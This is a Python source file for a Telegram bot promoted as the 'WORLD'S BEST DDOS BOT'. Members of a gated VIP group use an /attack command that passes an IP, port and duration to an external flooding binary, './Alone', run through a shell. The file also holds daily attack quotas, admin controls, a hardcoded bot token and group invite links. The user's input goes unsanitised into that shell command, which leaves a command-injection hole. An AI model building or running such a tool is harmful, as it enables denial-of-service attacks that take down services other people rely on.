import telebot
import datetime
import time
import subprocess
import random
import aiohttp
import threading
import pytesseract
from PIL import Image
import requests
from io import BytesIO
from telebot import types

# Insert your Telegram bot token here
bot = telebot.TeleBot('8112431515:AAFuESYE6F5lspagyZTNlECzZeJJUy70wy4')

# Admin user IDs
admin_id = ["6539807903"]

# Group and channel details
GROUP_ID = "-1001985887035"
CHANNEL_USERNAME = "@gauravbhaihack"

# Default cooldown and attack limits
COOLDOWN_TIME = 10  # Cooldown in seconds
ATTACK_LIMIT = 5  # Max attacks per day
global_pending_attack = None
global_last_attack_time = None
pending_feedback = {}  # यूजर 

# Files to store user data
USER_FILE = "users.txt"

# Dictionary to store user states
user_data = {}
global_last_attack_time = None  # Global cooldown tracker

# 🎯 Random Image URLs  
image_urls = [
    "https://envs.sh/g7a.jpg",
    "https://envs.sh/Vwc.jpg"
]

def is_user_in_channel(user_id):
    try:
        member = bot.get_chat_member(CHANNEL_USERNAME, user_id)
        return member.status in ['member', 'administrator', 'creator']
    except:
        return False

# Function to load user data from the file
def load_users():
    try:
        with open(USER_FILE, "r") as file:
            for line in file:
                # Skip empty lines
                if not line.strip():
                    continue
                # Try to split and unpack the line, handle malformed lines
                try:
                    user_id, attacks, last_reset = line.strip().split(',')
                    user_data[user_id] = {
                        'attacks': int(attacks),
                        'last_reset': datetime.datetime.fromisoformat(last_reset),
                        'last_attack': None
                    }
                except ValueError:
                    print(f"Skipping malformed line: {line.strip()}")
    except FileNotFoundError:
        print(f"{USER_FILE} not found, initializing an empty user database.")
        
def save_users():
    with open(USER_FILE, "w") as file:
        for user_id, data in user_data.items():
            file.write(f"{user_id},{data['attacks']},{data['last_reset'].isoformat()}\n")

# Middleware to ensure users are joined to the channel
def is_user_in_channel(user_id):
    try:
        member = bot.get_chat_member(CHANNEL_USERNAME, user_id)
        return member.status in ['member', 'administrator', 'creator']
    except:
        return False

# Function to handle attacks
# Initialize the global flag at the top of the script
is_attack_in_progress = False  # Global flag to track attack status

@bot.message_handler(commands=['attack'])
def handle_attack(message):
    global is_attack_in_progress  # Use the global flag to track attack progress

    user_id = str(message.from_user.id)
    user_name = message.from_user.first_name
    command = message.text.split()

    # Checking if the user is in the designated group
    if message.chat.id != int(GROUP_ID):
        bot.reply_to(message, f"🚫 **VIP Access Denied!**\n"
                              f"👑 *This service is available exclusively for VIP group members.*\n"
                              f"🔗 Join now and enjoy the VIP perks: {CHANNEL_USERNAME}")
        return

    # Verifying if the user is in the required channel
    if not is_user_in_channel(user_id):
        bot.reply_to(message, f"⚠️ **Oops, looks like you haven't joined the VIP Channel!**\n"
                              f"🔓 Join now to access VIP features: {CHANNEL_USERNAME}")
        return

    # Preventing attack if feedback is pending
    if pending_feedback.get(user_id, False):
        bot.reply_to(message, "😡 **Feedback Pending!**\n"
                              "🚨 *Please submit the required screenshot before launching a new attack.*")
        return

    # Checking if an attack is already in progress
    if is_attack_in_progress:
        bot.reply_to(message, "⚠️ **Hold on, an attack is already in progress!**\n"
                              "💥 *Please wait until the current attack finishes before starting a new one.*")
        return

    # Mark the attack as in progress
    is_attack_in_progress = True

    # Initialize user data if it's the first time
    if user_id not in user_data:
        user_data[user_id] = {'attacks': 0, 'last_reset': datetime.datetime.now(), 'last_attack': None}

    user = user_data[user_id]

    # Checking if the user has reached the attack limit
    if user['attacks'] >= ATTACK_LIMIT:
        bot.reply_to(message, f"❌ **Attack Limit Reached!**\n"
                              "⏳ *You have exhausted your daily attack limit.*\n"
                              "🔄 Try again tomorrow to unleash more power!")
        is_attack_in_progress = False  # Reset the flag if the limit is reached
        return

    # Handling incorrect command format
    if len(command) != 4:
        bot.reply_to(message, "⚠️ **Invalid Command Format!**\n"
                              "📜 *Usage:* /attack `<IP>` `<PORT>` `<TIME>`\n"
                              "Example: `/attack 192.168.1.1 8080 60`")
        is_attack_in_progress = False  # Reset the flag if format is invalid
        return

    # Parsing target, port, and duration
    target, port, time_duration = command[1], command[2], command[3]

    try:
        port = int(port)
        time_duration = int(time_duration)
    except ValueError:
        bot.reply_to(message, "❌ **Invalid Input!**\n"
                              "🔢 *Port and Time must be integers.*\n"
                              "Please try again with correct values.")
        is_attack_in_progress = False  # Reset the flag if there’s an invalid input
        return

    # Limiting duration to 180 seconds
    if time_duration > 180:
        bot.reply_to(message, "🚫 **Maximum Duration Exceeded!**\n"
                              "⏳ *The maximum attack duration is 180 seconds.*\n"
                              "Please adjust the time and try again.")
        is_attack_in_progress = False  # Reset the flag if duration exceeds limit
        return

    # Verifying if the user has a profile picture
    profile_photos = bot.get_user_profile_photos(user_id)
    if profile_photos.total_count > 0:
        profile_pic = profile_photos.photos[0][-1].file_id
    else:
        bot.reply_to(message, "❌ **Profile Picture Missing!**\n"
                              "📸 *Please set a profile picture to proceed with your VIP attack.*\n"
                              "Your profile picture is essential for the attack setup.")
        is_attack_in_progress = False  # Reset the flag if profile picture is missing
        return

    remaining_attacks = ATTACK_LIMIT - user['attacks'] - 1
    random_image = random.choice(image_urls)

    # Sending attack start notification with profile picture
    bot.send_photo(message.chat.id, profile_pic, caption=f"👑 **VIP User:** @{user_name}\n"
                                                        f"🚀 **Attack Initiated!**\n"
                                                        f"🎯 **Target:** `{target}:{port}`\n"
                                                        f"⏳ **Duration:** {time_duration}s\n"
                                                        f"⚡ **Remaining Attacks:** {remaining_attacks}\n"
                                                        f"📸 **Screenshot Required!**\n"
                                                        f"⏳ **Progress: 0%**")

    # Marking that feedback is pending for the user
    pending_feedback[user_id] = True  

    # Increment the attack count for the user
    user['attacks'] += 1

    # Save updated user data
    save_users()

    # Crafting the attack command
    full_command = f"./Alone {target} {port} {time_duration} 900"

    # Attempting to run the attack
    try:
        subprocess.run(full_command, shell=True, check=True)
    except subprocess.CalledProcessError as e:
        bot.reply_to(message, f"❌ **Error Encountered!**\n"
                              f"💥 *Something went wrong while launching the attack.*\n"
                              f"Details: {e}")
        pending_feedback[user_id] = False
        is_attack_in_progress = False  # Reset the flag if attack failed
        return

    # Sending attack completion message
    bot.send_message(message.chat.id, 
                     f"✅ **VIP Attack Complete!**\n"
                     f"🎯 `{target}:{port}` **Successfully Targeted!**\n"
                     f"⏳ **Duration:** {time_duration}s\n"
                     f"⚡ **Remaining Attacks:** {remaining_attacks}\n"
                     f"⏳ **Progress: 100%**")

    # Mark the attack as finished
    is_attack_in_progress = False  # Reset the flag after attack finishes

    threading.Thread(target=send_attack_finished, args=(message, user_name, target, port, time_duration, remaining_attacks)).start()

def send_attack_finished(message, user_name, target, port, time_duration, remaining_attacks):
    bot.send_message(message.chat.id, 
                     f"🚀 **𝐍𝐄𝐗𝐓 𝐀𝐓𝐓𝐀𝐂𝐊 𝐑𝐄𝐀𝐃𝐘!** ⚡")


# Start auto-reset in a separate thread



@bot.message_handler(commands=['checkoutcooldown'])
def check_cooldown(message):
    if global_last_attack_time and (datetime.datetime.now() - global_last_attack_time).seconds < COOLDOWN_TIME:
        remaining_time = COOLDOWN_TIME - (datetime.datetime.now() - global_last_attack_time).seconds
        bot.reply_to(message, f"Global cooldown: {remaining_time} seconds remaining.")
    else:
        bot.reply_to(message, "No global cooldown. You can initiate an attack.")

# Command to check remaining attacks for a user
@bot.message_handler(commands=['remaining'])
def check_remaining_attack(message):
    user_id = str(message.from_user.id)
    if user_id not in user_data:
        bot.reply_to(message, f"You have {ATTACK_LIMIT} attacks remaining for today.")
    else:
        remaining_attacks = ATTACK_LIMIT - user_data[user_id]['attacks']
        bot.reply_to(message, f"You have {remaining_attacks} attacks remaining for today.")

# Admin commands
@bot.message_handler(commands=['reset'])
def reset_user(message):
    if str(message.from_user.id) not in admin_id:
        bot.reply_to(message, "Only admins can use this command.")
        return

    command = message.text.split()
    if len(command) != 2:
        bot.reply_to(message, "Usage: /reset <user_id>")
        return

    user_id = command[1]
    if user_id in user_data:
        user_data[user_id]['attacks'] = 0
        save_users()
        bot.reply_to(message, f"Attack limit for user {user_id} has been reset.")
    else:
        bot.reply_to(message, f"No data found for user {user_id}.")

@bot.message_handler(commands=['setcooldown'])
def set_cooldown(message):
    if str(message.from_user.id) not in admin_id:
        bot.reply_to(message, "Only admins can use this command.")
        return

    command = message.text.split()
    if len(command) != 2:
        bot.reply_to(message, "Usage: /setcooldown <seconds>")
        return

    global COOLDOWN_TIME
    try:
        COOLDOWN_TIME = int(command[1])
        bot.reply_to(message, f"Cooldown time has been set to {COOLDOWN_TIME} seconds.")
    except ValueError:
        bot.reply_to(message, "Please provide a valid number of seconds.")

@bot.message_handler(commands=['viewusers'])
def view_users(message):
    if str(message.from_user.id) not in admin_id:
        bot.reply_to(message, "Only admins can use this command.")
        return

    user_list = "\n".join([f"User ID: {user_id}, Attacks Used: {data['attacks']}, Remaining: {ATTACK_LIMIT - data['attacks']}" 
                           for user_id, data in user_data.items()])
    bot.reply_to(message, f"User Summary:\n\n{user_list}")
    

# Dictionary to store feedback counts per user
feedback_count_dict = {}

@bot.message_handler(content_types=['photo'])
def handle_screenshot(message):
    user_id = str(message.from_user.id)
    user_name = message.from_user.first_name
    feedback_count = feedback_count_dict.get(user_id, 0) + 1  # Increment feedback count for the user

    # Update feedback count in the dictionary
    feedback_count_dict[user_id] = feedback_count

    # 🚀 Check if user is in the VIP Channel
    try:
        user_status = bot.get_chat_member(CHANNEL_USERNAME, user_id).status
        if user_status not in ['member', 'administrator', 'creator']:
            bot.reply_to(message, f"❌ **Access Denied!**\n"
                                  f"👑 *You must join our VIP Channel to submit feedback.*\n"
                                  f"🔗 **Join Here:** [Click to Join]({CHANNEL_USERNAME})")
            return  
    except Exception as e:
        bot.reply_to(message, "❌ **Verification Failed!**\n"
                              f"🔧 *Please ensure the bot is an admin in the channel.*\n"
                              f"⛔ *Verification could not be completed, please try again.*")
        return  

    # ✅ Proceed if User is in the Channel
    if pending_feedback.get(user_id, False):
        pending_feedback[user_id] = False  

        # 🚀 Forward Screenshot to Channel  
        bot.forward_message(CHANNEL_USERNAME, message.chat.id, message.message_id)

        # 🔥 Send Confirmation with Screenshot Number
        bot.send_message(CHANNEL_USERNAME, 
                         f"📸 **Feedback Received!**\n"
                         f"👤 **User:** `{user_name}`\n"
                         f"🆔 **User ID:** `{user_id}`\n"
                         f"🔢 **Screenshot No.:** `{feedback_count}`\n"
                         f"💬 **Feedback from VIP member!**")

        # Respond to the user
        bot.reply_to(message, "✅ **Feedback Accepted!**\n"
                              "🚀 *Your screenshot has been successfully submitted. Ready for your next attack!*")
    else:
        bot.reply_to(message, "❌ **Invalid Response!**\n"
                              "⚠️ *It seems you submitted this screenshot too early. Please wait for the correct time.*")
                              
@bot.message_handler(commands=['help'])
def show_help(message):
    help_text = """
    🌟 **Welcome to the Help Section!** 🌟

    Here are the available commands:

    1. **/start**  
       - Start the bot and get a welcome message.
    
    2. **/attack <IP> <PORT> <TIME>**  
       - Initiates a DDOS attack simulation.

    3. **/checkoutcooldown**  
       - Check the global cooldown time before initiating the next attack.

    4. **/remaining**  
       - Check how many attacks are left for today.

    5. **/reset <user_id>**  
       - Reset the attack count for a user (Admin Only).

    6. **/setcooldown <seconds>**  
       - Set the global cooldown time (Admin Only).

    7. **/viewusers**  
       - View all users and their attack statistics (Admin Only).

    8. **/feedback**  
       - Submit a screenshot of the feedback after completing the attack.

    🚨 **Note:** Only users who have joined the VIP group/channel can use the attack features.

    🚀 **To unlock VIP features, join our group:**  
    [Join Now](https://t.me/+jbaG-YR7JGJlY2U1)
    """
    bot.reply_to(message, help_text, parse_mode="Markdown")                              
                              
@bot.message_handler(commands=['start'])
def welcome_start(message):
    user_name = message.from_user.first_name
    response = f"""🌟🔥 **WELCOME TO THE POWER ZONE, {user_name}!** 🔥🌟

🚀 **You’ve entered the realm of elite power!**  
💥 Welcome to the **WORLD'S BEST DDOS BOT** — exclusive and powerful.  
⚡ **Become the KING, DOMINATE THE WEB!**

🔗 **To access this powerful tool, join us now:**  
👉 [Join Our Exclusive Telegram Group](https://t.me/+n2PZnVkPx_hlYmNl) 🚀🔥

**Note:** *Only VIP members can unlock the full potential of the bot. Your journey to domination starts here! 💪*
"""

    bot.reply_to(message, response, parse_mode="Markdown")
# Function to reset daily limits automatically
def auto_reset():
    while True:
        now = datetime.datetime.now()
        seconds_until_midnight = ((24 - now.hour - 1) * 3600) + ((60 - now.minute - 1) * 60) + (60 - now.second)
        time.sleep(seconds_until_midnight)
        for user_id in user_data:
            user_data[user_id]['attacks'] = 0
            user_data[user_id]['last_reset'] = datetime.datetime.now()
        save_users()

# Start auto-reset thread
reset_thread = threading.Thread(target=auto_reset, daemon=True)
reset_thread.start()

# Load user data on startup
load_users()

# Start bot polling in a separate thread


#bot.polling()
# Start bot polling in a separate thread
def run_bot():
    bot.polling(none_stop=True)

# Start the bot's main polling loop directly
if __name__ == "__main__":
    run_bot()
        
 





